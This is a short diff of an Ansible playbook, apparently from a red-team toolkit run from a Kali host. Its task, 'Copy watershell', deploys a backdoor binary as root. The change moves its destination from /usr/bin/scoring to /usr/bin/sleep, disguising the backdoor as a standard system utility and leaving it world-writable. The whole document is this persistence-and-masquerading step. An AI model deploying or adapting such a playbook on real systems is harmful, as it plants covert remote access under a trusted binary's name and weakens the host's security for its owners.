@@ -6,7 +6,7 @@
     - name: Copy watershell
       ansible.builtin.copy:
         src: /home/kali/zonifer/bins/scoring
-        dest: /usr/bin/scoring
+        dest: /usr/bin/sleep
         owner: root
         group: root
         mode: '0777'
